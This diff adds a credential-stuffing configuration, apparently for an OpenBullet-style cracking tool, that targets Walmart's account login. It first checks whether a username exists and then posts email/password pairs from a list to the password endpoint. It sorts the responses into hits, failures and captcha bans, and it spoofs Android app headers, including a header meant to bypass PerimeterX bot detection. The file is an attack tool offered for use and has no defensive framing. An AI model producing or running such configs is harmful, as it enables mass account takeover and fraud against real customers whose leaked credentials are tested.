@@ -1,0 +1,96 @@
+[SETTINGS]
+{
+  "Name": "Walmart",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-18T21:30:43.5027368-05:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@troll200112",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#POST REQUEST POST "https://www.walmart.com/orchestra/account/electrode/api/identity/v1/validateemail" 
+  CONTENT "{\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Cookie: oo_cloud=true" 
+  HEADER "Wmx_svc_params: channel=9" 
+  HEADER "Wm_consumer.banner: GR" 
+  HEADER "Banner: WM_OD" 
+  HEADER "X-O-Mart: US" 
+  HEADER "X-O-Bu: WALMART" 
+  HEADER "X-O-Vertical: GM" 
+  HEADER "X-O-Segment: oaoh" 
+  HEADER "X-O-Platform: android" 
+  HEADER "X-O-Platform-Version: 22.4" 
+  HEADER "X-Px-Authorization: 4" 
+  HEADER "X-Px-Bypass-Reason: Error checking sdk enabled - general failure" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: WMT1H/22.4 Android/9" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "/account/signin/withpassword" 
+  KEYCHAIN Failure OR 
+    KEY "email address" 
+    KEY "\"user_compromised" 
+  KEYCHAIN Ban OR 
+    KEY "action\":\"captcha\"" 
+
+#POST REQUEST POST "https://www.walmart.com/orchestra/account/electrode/api/identity/password" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"authPreference\":\"PASSWORD\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Cookie: oo_cloud=true" 
+  HEADER "Wmx_svc_params: channel=9" 
+  HEADER "Wm_consumer.banner: GR" 
+  HEADER "Banner: WM_OD" 
+  HEADER "X-O-Mart: US" 
+  HEADER "X-O-Bu: WALMART" 
+  HEADER "X-O-Vertical: GM" 
+  HEADER "X-O-Segment: oaoh" 
+  HEADER "X-O-Platform: android" 
+  HEADER "X-O-Platform-Version: 22.4" 
+  HEADER "X-Px-Authorization: 4" 
+  HEADER "X-Px-Bypass-Reason: Error checking sdk enabled - general failure" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: WMT1H/22.4 Android/9" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "user_auth_fail" 
+    KEY "user_compromised" 
+  KEYCHAIN Success OR 
+    KEY "customerType" 
+    KEY "deprecatedCustomerId" 
+  KEYCHAIN Ban OR 
+    KEY "action\":\"captcha\"," 
+
